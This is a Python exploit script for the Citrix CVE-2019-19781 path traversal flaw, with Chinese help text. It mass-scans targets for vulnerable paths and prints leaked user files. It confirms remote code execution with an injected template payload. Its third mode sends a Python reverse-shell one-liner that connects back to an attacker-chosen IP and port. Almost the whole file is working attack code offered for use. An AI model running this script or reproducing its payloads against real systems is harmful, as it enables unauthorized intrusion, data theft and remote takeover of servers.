#@author:九世
#@time:2019/1/10
#@file:CVE-2019-19781.py

from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
from colorama import init,Fore
import gevent
import sys
import os
import warnings
import asyncio
import requests

warnings.filterwarnings("ignore")
init(wrap=True)
class dictscan(object):
    def __init__(self):
        self.help='Citrix路径遍历风险检测(CVE-2019-19781)\nid:1单个路径测试\nid:2批量测试\nid:3反弹shell'
        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36','NSC_USER':'c','NSC_NONCE': 'c'}
        self.headers2={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36','NSC_USER': '../../../../netscaler/portal/templates/cdl','NSC_NONCE': 'c'}
        self.path=['/vpn/../vpns/cfg/smb.conf','/vpn/../vpns/portal/scripts/newbm.pl','/vpn/../vpns/portal/scripts/rmbm.pl','/vpn/../vpns/portal/cdl.xml']
        self.rceurl='/vpn/../vpns/portal/scripts/newbm.pl'
        self.shell='''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'''
        self.timeout=3
        self.xcs=[]
        self.djcs=[]
        self.ybs=[]
        self.calc=0
        self.calc2=0

    def reqtscan(self,url,yuan,ip='',port=0):
        if yuan=='shell':
            urls = '{}{}'.format(sys.argv[2], self.rceurl)
            payload=self.shell.format(host=ip,port=port)
            data = '''url={}'''.format(url) + '''&title=cdl&desc=[% template.new({'BLOCK'='print `'''+payload+'''`})%]'''
            requests.post(url=urls,headers=self.headers2,data=data)
            print(Fore.YELLOW+'!!!已执行反弹shell!!!')
        else:
            try:
                rqt=requests.get(url=url,headers=self.headers,timeout=self.timeout,verify=False)
                if rqt.status_code==200:
                    print(Fore.GREEN + '[+] ' + Fore.WHITE + 'url:{} httpcode:{}'.format(rqt.url, rqt.status_code))
                    if self.rceurl in rqt.url:
                        data='''url={}'''.format(yuan)+'''&title=cdl&desc=[% template.new({'BLOCK'='print `uname -a`})%]'''
                        rqt2=requests.post(url=rqt.url,headers=self.headers2,timeout=self.timeout,data=data,verify=False)
                        if '//parent.window.ns_reload();' in rqt2.text:
                            print(Fore.YELLOW+'[RCE] '+Fore.WHITE+'存在RCE url:{}'.format(yuan))
                            print(Fore.YELLOW + '[RCE] ' + Fore.WHITE + '存在RCE url:{}'.format(rqt2.url),file=open('RCE.txt','a',encoding='utf-8'))

                    if '/vpn/../vpns/portal/cdl.xml' in rqt.url:
                        print(Fore.BLUE+'[+] '+Fore.WHITE+'userfile')
                        print(rqt.text)
                elif rqt.status_code==403:
                    print(Fore.YELLOW + '[!] ' + Fore.WHITE + 'url:{} httpcode:{}'.format(rqt.url, rqt.status_code))
            except:
                pass
    def xc(self,rw):
        for v in rw:
            for path in self.path:
                urls='{}{}'.format(str(v).rstrip('/'),path)
                self.xcs.append(gevent.spawn(self.reqtscan,urls,v))
        gevent.joinall(self.xcs)
        self.xcs.clear()

    def djc(self):
        for x in self.ybs:
            if self.calc2==100:
                p=Process(target=self.xc,args=(self.djcs,))
                p.start()
                self.djcs.clear()
                self.calc2=0
                p.join()
            self.djcs.append(x)
            self.calc2+=1
        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,))
            p.start()
            self.djcs.clear()
            self.calc2 = 0
            p.join()

    async def yb(self):
        if len(sys.argv)>=3:
            if int(sys.argv[1])==1:
                for v in self.path:
                    urls='{}{}'.format(str(sys.argv[2]).rstrip('/'),v)
                    self.reqtscan(urls,v)
            elif int(sys.argv[1])==2:
                if os.path.exists(str(sys.argv[2])):
                    print(Fore.GREEN+'[+] '+Fore.WHITE+'{}加载中'.format(sys.argv[2]))
                    dk=open(str(sys.argv[2]),'r',encoding='utf-8')
                    for r in dk.readlines():
                        data="".join(r.split('\n'))
                        if self.calc==100:
                            self.djc()
                            self.ybs.clear()
                            self.calc=0
                        self.ybs.append(data)
                        self.calc+=1

                    if len(self.ybs)>0:
                        self.djc()
                        self.ybs.clear()
                        self.calc = 0
                else:
                    print(Fore.RED+'[-] '+Fore.WHITE+'{}文件不存在'.format(sys.argv[2]))
                    exit()
            elif int(sys.argv[1])==3:
                self.reqtscan(str(sys.argv[2]),"shell",ip=str(sys.argv[3]),port=int(sys.argv[4]))
        else:
            print(Fore.YELLOW+'[!] '+Fore.WHITE+'{}\npython3 CVE-2019-19781.py [id] [file/url]'.format(self.help))

if __name__ == '__main__':
    obj=dictscan()
    loop=asyncio.get_event_loop()
    tk=loop.create_task(obj.yb())
    loop.run_until_complete(tk)